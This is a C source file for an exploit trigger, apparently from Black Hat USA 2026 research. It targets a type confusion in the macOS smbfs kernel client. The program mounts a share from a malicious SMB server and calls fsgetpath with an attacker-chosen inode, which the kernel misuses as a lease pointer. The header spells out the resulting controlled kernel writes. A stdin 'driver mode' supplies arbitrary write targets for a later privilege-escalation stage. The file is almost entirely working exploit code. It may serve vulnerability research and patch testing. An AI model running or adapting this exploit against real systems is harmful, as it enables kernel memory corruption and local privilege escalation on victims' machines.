/*
 * corrupt.c -- stage-1 trigger for the smbfs RqLs create-context type
 * confusion (Black Hat USA 2026, Blazakis/Calif; macOS 26.4.1 / 25E253).
 *
 * Flow:
 *   1. mount_smbfs a share served by server/smb_server.py;
 *   2. the server answered the mount-time AAPL SERVER_QUERY with
 *      VolumeCaps = kAAPL_SUPPORT_RESOLVE_ID, so smbfs_vget() resolves
 *      unknown inodes over the wire (smb2fs_smb_cmpd_resolve_id);
 *   3. fsgetpath(buf, size, &fsid, INO) sends a compound Create/Close with
 *      an "AAPL" RESOLVE_ID create context carrying file_id = INO. The
 *      kernel stacks it in
 *          struct smb2_create_ctx_resolve_id { uint64_t file_id; ... }
 *      and points createp->create_contextp at it;
 *   4. the malicious server answers the Create with an "RqLs" lease
 *      context. smb2_smb_parse_create_contexts() reinterprets
 *      create_contextp as struct smb2_dur_hndl_and_lease * and uses
 *      leasep = *(u64 *)create_contextp == INO as "struct smb2_lease *".
 *
 * Result in the kernel (K = --ino):
 *      smbnode_lease_lock(K)     ; writes K+0x10 / K+0x18 (then 0 again)
 *      if (*(u64*)(K+0x30) != key_hi || *(u64*)(K+0x38) != key_low) bail
 *      *(u32*)(K+0x2c) = lease_state          (v1/v2)
 *      *(u16*)(K+0x50) = epoch                (v2, 52-byte ctx)
 *      *(u64*)(K+0x20) |= SMB2_LEASE_GRANTED (0x80)
 *      smbnode_lease_unlock(K)   ; K+0x10 / K+0x18 forced back to 0
 *
 * Default --ino 0x4141414141414141 gives a clean, attributable panic on the
 * victim (faulting address 0x4141414141414151 inside
 * smb2_smb_parse_create_contexts) proving control of the write target.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <errno.h>
#include <fcntl.h>
#include <getopt.h>
#include <limits.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <sys/types.h>
#include <sys/wait.h>

extern int fsgetpath(char *buf, size_t bufsize, fsid_t *fsid,
                     uint64_t objid);

#define DEFAULT_MOUNT  "/tmp/lpe-smb-mnt"
#define DEFAULT_SERVER "//guest@127.0.0.1:1445/poc"
#define DEFAULT_INO    0x4141414141414141ULL

static const char *opt_server = DEFAULT_SERVER;
static char        opt_mount[PATH_MAX] = DEFAULT_MOUNT;
static uint64_t    opt_ino    = DEFAULT_INO;
static int         opt_repeat = 1;
static int         opt_stay   = 0;
static int         opt_stdio  = 0;

static void
usage(const char *prog)
{
    fprintf(stderr,
        "usage: %s [--server URL] [--mount DIR] [--ino HEX] [--repeat N]\n"
        "          [--stay] [--stdio]\n"
        "\n"
        "  --server  SMB URL of the malicious server (default %s)\n"
        "  --mount   mountpoint directory (default %s)\n"
        "  --ino     inode number passed to fsgetpath = K, the confused\n"
        "            smb2_lease pointer (default 0x%llx = panic demo)\n"
        "  --repeat  number of fsgetpath() calls (default 1)\n"
        "  --stay    keep the mount mounted when done\n"
        "  --stdio   after mounting, loop reading one hex K per line from\n"
        "            stdin and fsgetpath() it; prints 'done <rc> <errno>' per\n"
        "            line on stdout; 'quit' or EOF exits (implies --stay)\n",
        prog, DEFAULT_SERVER, DEFAULT_MOUNT, DEFAULT_INO);
}

static int
run_cmd(const char *path, char *const argv[])
{
    pid_t pid = fork();
    int status;

    if (pid < 0)
        return -1;
    if (pid == 0) {
        execv(path, argv);
        _exit(127);
    }
    while (waitpid(pid, &status, 0) < 0) {
        if (errno != EINTR)
            return -1;
    }
    if (WIFEXITED(status))
        return WEXITSTATUS(status);
    return -1;
}

static void
do_unmount(void)
{
    char *umount_argv[] = { "umount", opt_mount, NULL };
    char *diskutil_argv[] = { "diskutil", "unmount", "force", opt_mount,
                              NULL };

    if (run_cmd("/sbin/umount", umount_argv) != 0)
        run_cmd("/usr/bin/diskutil", diskutil_argv);
}

static int
do_mount(void)
{
    char *argv[] = { "mount_smbfs", "-N", (char *)opt_server, opt_mount,
                     NULL };
    struct statfs sfs;
    int i, rc;

    if (mkdir(opt_mount, 0755) < 0 && errno != EEXIST) {
        fprintf(stderr, "[corrupt] mkdir %s: %s\n", opt_mount,
                strerror(errno));
        return -1;
    }

    do_unmount();

    fprintf(stderr, "[corrupt] mounting %s on %s\n", opt_server, opt_mount);
    rc = run_cmd("/sbin/mount_smbfs", argv);
    if (rc != 0) {
        fprintf(stderr, "[corrupt] mount_smbfs exited with status %d\n", rc);
        return -1;
    }

    for (i = 0; i < 100; i++) {
        if (statfs(opt_mount, &sfs) == 0 &&
            strcmp(sfs.f_fstypename, "smbfs") == 0) {
            fprintf(stderr, "[corrupt] mounted (fsid %d,%d)\n",
                    sfs.f_fsid.val[0], sfs.f_fsid.val[1]);
            return 0;
        }
        usleep(100 * 1000);
    }
    fprintf(stderr, "[corrupt] %s never came up as smbfs\n", opt_mount);
    return -1;
}

int
main(int argc, char **argv)
{
    static const struct option long_opts[] = {
        { "server", required_argument, NULL, 's' },
        { "mount",  required_argument, NULL, 'm' },
        { "ino",    required_argument, NULL, 'i' },
        { "repeat", required_argument, NULL, 'r' },
        { "stay",   no_argument,       NULL, 'k' },
        { "stdio",  no_argument,       NULL, 't' },
        { "help",   no_argument,       NULL, 'h' },
        { NULL, 0, NULL, 0 }
    };
    int ch, rc = 1, i;
    struct statfs sfs;
    char path[PATH_MAX];

    while ((ch = getopt_long(argc, argv, "s:m:i:r:kth", long_opts,
                             NULL)) != -1) {
        switch (ch) {
        case 's': opt_server = optarg; break;
        case 'm':
            snprintf(opt_mount, sizeof(opt_mount), "%s", optarg);
            break;
        case 'i': opt_ino = strtoull(optarg, NULL, 0); break;
        case 'r': opt_repeat = atoi(optarg); break;
        case 'k': opt_stay = 1; break;
        case 't': opt_stdio = 1; break;
        case 'h':
        default:
            usage(argv[0]);
            return ch == 'h' ? 0 : 2;
        }
    }

    if (opt_repeat < 1)
        opt_repeat = 1;
    if (opt_stdio)
        opt_stay = 1;

    if (do_mount() != 0)
        return 1;

    if (statfs(opt_mount, &sfs) != 0) {
        fprintf(stderr, "[corrupt] statfs: %s\n", strerror(errno));
        goto out;
    }

    if (opt_stdio) {
        /* driver mode: one hex K per line on stdin -> one fsgetpath() */
        char line[128];

        fprintf(stderr, "[corrupt] stdio mode ready (fsid %d,%d)\n",
                sfs.f_fsid.val[0], sfs.f_fsid.val[1]);
        printf("ready\n");
        fflush(stdout);
        while (fgets(line, sizeof(line), stdin) != NULL) {
            uint64_t ino;

            line[strcspn(line, "\r\n")] = 0;
            if (strcmp(line, "quit") == 0)
                break;
            if (line[0] == 0 || line[0] == '#') {
                printf("done 0 0\n");
                fflush(stdout);
                continue;
            }
            ino = strtoull(line, NULL, 0);
            errno = 0;
            fprintf(stderr, "[corrupt] fsgetpath ino=0x%llx\n",
                    (unsigned long long)ino);
            if (fsgetpath(path, sizeof(path), &sfs.f_fsid, ino) == 0) {
                fprintf(stderr, "[corrupt]   -> %s\n", path);
                printf("done 0 0\n");
            } else {
                int e = errno;
                fprintf(stderr, "[corrupt]   -> %s\n", strerror(e));
                printf("done %d %d\n", -1, e);
            }
            fflush(stdout);
        }
        rc = 0;
        goto out;
    }

    fprintf(stderr, "[corrupt] fsgetpath(fsid=%d,%d ino=0x%llx) x%d\n",
            sfs.f_fsid.val[0], sfs.f_fsid.val[1],
            (unsigned long long)opt_ino, opt_repeat);

    for (i = 0; i < opt_repeat; i++) {
        int err = fsgetpath(path, sizeof(path), &sfs.f_fsid, opt_ino);
        if (err == 0) {
            fprintf(stderr, "[corrupt] fsgetpath -> %s\n", path);
        } else {
            fprintf(stderr, "[corrupt] fsgetpath: %s (errno=%d)\n",
                    strerror(errno), errno);
        }
    }

    rc = 0;

out:
    if (opt_stay) {
        fprintf(stderr, "[corrupt] leaving %s mounted (--stay)\n",
                opt_mount);
    } else {
        fprintf(stderr, "[corrupt] unmounting %s\n", opt_mount);
        do_unmount();
        rmdir(opt_mount);
    }
    return rc;
}
